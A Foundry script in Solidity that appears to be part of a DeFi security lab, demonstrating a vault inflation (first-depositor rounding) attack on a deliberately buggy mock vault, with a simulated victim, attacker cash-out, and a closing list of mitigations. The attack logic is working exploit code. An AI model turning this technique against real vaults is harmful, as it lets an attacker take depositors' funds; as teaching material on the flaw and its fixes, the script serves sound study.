// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "./Deploy.s.sol";
import "../src/attackers/Attacker_PoolImbalance.sol";

contract DemoPoolAttack is Script {
    DeployScript public deploy;
    Attacker_PoolImbalance public attacker;

    function run() external {
        // 1. Deploy infrastructure
        deploy = new DeployScript();
        deploy.run();

        (
            address tokenA,
            address tokenB,
            address dai,
            address govToken,
            address factory,
            address router,
            address pairAB,
            address oracleSpot,
            address oracleTWAP,
            address flashLender,
            address lendingMock,
            address governanceWeak,
            address vaultBuggy,
            address vaultFixed
        ) = deploy.getAddresses();

        tokenB; dai; govToken; factory; router; pairAB;
        oracleSpot; oracleTWAP; flashLender; lendingMock;
        governanceWeak; vaultFixed;

        console.log("=== VAULT INFLATION ATTACK DEMO ===");
        console.log("");

        vm.startBroadcast();

        // 2. Deploy attacker
        attacker = new Attacker_PoolImbalance();
        MockERC20 token = MockERC20(tokenA);
        VaultBuggy vault = VaultBuggy(vaultBuggy);

        // 3. Fund attacker
        token.mint(address(attacker), 100000 * 1e18);
        console.log("Attacker funded with 100,000 tokenA");

        // 4. Show initial state
        console.log("");
        console.log("Initial Vault State:");
        console.log("  Total shares:", vault.totalShares());
        console.log("  Total assets:", vault.totalAssets() / 1e18);

        console.log("Initial Attacker State:");
        console.log("  Attacker tokenA balance:", token.balanceOf(address(attacker)) / 1e18);
        console.log("  Attacker vault shares:", attacker.inflationAttackShares());

        // 5. Execute attack
        console.log("");
        console.log("Executing Vault Inflation Attack...");
        console.log("  Step 1: Attacker becomes first depositor with 1 wei");
        console.log("  Step 2: Attacker donates 50,000 tokenA to vault");
        console.log("  Step 3: Share price is now inflated!");

        try attacker.attackVaultInflation(
            vaultBuggy,
            tokenA,
            50000 * 1e18
        ) {
            console.log("");
            console.log("Attack setup successful!");

            uint256 totalShares = vault.totalShares();
            uint256 totalAssets = vault.totalAssets();

            console.log("Vault State After Manipulation:");
            console.log("  Total shares:", totalShares);
            console.log("  Total assets:", totalAssets / 1e18);

            if (totalShares > 0) {
                console.log("  Share value:", (totalAssets / totalShares) / 1e18);
            }

            console.log("Attacker State After Manipulation:");
            console.log("  Attacker tokenA balance:", token.balanceOf(address(attacker)) / 1e18);
            console.log("  Attacker vault shares:", attacker.inflationAttackShares());

            // 6. Simulate victim deposit
            console.log("");
            console.log("Victim attempts to deposit 25,000 tokenA...");

            address simulatedVictim = msg.sender;
            token.mint(simulatedVictim, 25000 * 1e18);

            console.log("Victim State Before Deposit:");
            console.log("  Victim tokenA balance:", token.balanceOf(simulatedVictim) / 1e18);

            token.approve(vaultBuggy, type(uint256).max);
            uint256 victimShares = vault.deposit(25000 * 1e18);

            console.log("Victim State After Deposit:");
            console.log("  Victim received shares:", victimShares);
            console.log("  Expected: ~25,000 shares");
            console.log("  Actual shares after manipulation:", victimShares);
            console.log("  Victim tokenA balance after deposit:", token.balanceOf(simulatedVictim) / 1e18);

            console.log("");
            console.log("Vault State After Victim Deposit:");
            console.log("  Total shares:", vault.totalShares());
            console.log("  Total assets:", vault.totalAssets() / 1e18);
            console.log("  Attacker vault shares:", attacker.inflationAttackShares());

            if (victimShares == 0) {
                console.log("");
                console.log("=== ROUNDING EXPLOIT CONFIRMED ===");
                console.log("Victim received 0 shares due to rounding!");
                console.log("Victim's 25,000 tokenA are now trapped in vault!");
                console.log("Proceeding to attacker cash-out...");

                // ===== CASH-OUT EVIDENCE =====
                uint256 attackerBalBeforeWithdraw = token.balanceOf(address(attacker));
                uint256 vaultAssetsBeforeWithdraw = vault.totalAssets();
                uint256 attackerSharesBeforeWithdraw = attacker.inflationAttackShares();

                console.log("");
                console.log("Before Withdraw:");
                console.log("  Attacker tokenA balance:", attackerBalBeforeWithdraw / 1e18);
                console.log("  Attacker shares:", attackerSharesBeforeWithdraw);
                console.log("  Vault total assets:", vaultAssetsBeforeWithdraw / 1e18);

                // NOTE:
                // Hàm dưới đây cần tồn tại trong Attacker_PoolImbalance.sol
                // để attacker contract tự redeem/withdraw phần tài sản của nó.
                uint256 withdrawnAmount = attacker.cashOutVaultInflation();

                uint256 attackerBalAfterWithdraw = token.balanceOf(address(attacker));
                uint256 vaultAssetsAfterWithdraw = vault.totalAssets();
                uint256 attackerSharesAfterWithdraw = attacker.inflationAttackShares();

                console.log("");
                console.log("Withdraw Transaction Successful!");
                console.log("  Withdrawn amount:", withdrawnAmount / 1e18);

                console.log("");
                console.log("After Withdraw:");
                console.log("  Attacker tokenA balance:", attackerBalAfterWithdraw / 1e18);
                console.log("  Attacker shares:", attackerSharesAfterWithdraw);
                console.log("  Vault total assets:", vaultAssetsAfterWithdraw / 1e18);

                console.log("");
                console.log("Net Gain Evidence:");
                console.log(
                    "  Attacker balance increase:",
                    (attackerBalAfterWithdraw - attackerBalBeforeWithdraw) / 1e18
                );
                console.log(
                    "  Vault assets decrease:",
                    (vaultAssetsBeforeWithdraw - vaultAssetsAfterWithdraw) / 1e18
                );

                console.log("");
                console.log("=== ATTACK FULLY SUCCESSFUL ===");
                console.log("Victim received 0 shares.");
                console.log("Attacker successfully withdrew inflated vault assets.");
                console.log("This demonstrates real fund extraction, not just setup.");
            } else {
                console.log("");
                console.log("Attack did not fully zero out victim shares in this run.");
                console.log("But the victim still received far fewer shares than expected.");
            }

        } catch Error(string memory reason) {
            console.log("Attack failed:", reason);
        } catch {
            console.log("Attack failed: unknown error");
        }

        vm.stopBroadcast();

        console.log("");
        console.log("=== EXPLANATION ===");
        console.log("This attack exploits vaults with improper first deposit handling.");
        console.log("Attacker can:");
        console.log("1. Be first depositor with tiny amount (1 wei)");
        console.log("2. Donate large amount to inflate share price");
        console.log("3. Subsequent deposits get rounded down to 0 shares");
        console.log("4. Withdraw disproportionate assets from the vault");
        console.log("");
        console.log("MITIGATION:");
        console.log("- Burn minimum shares on first deposit (like Uniswap V2)");
        console.log("- Use virtual shares/assets");
        console.log("- Check balance before/after transfer");
    }
}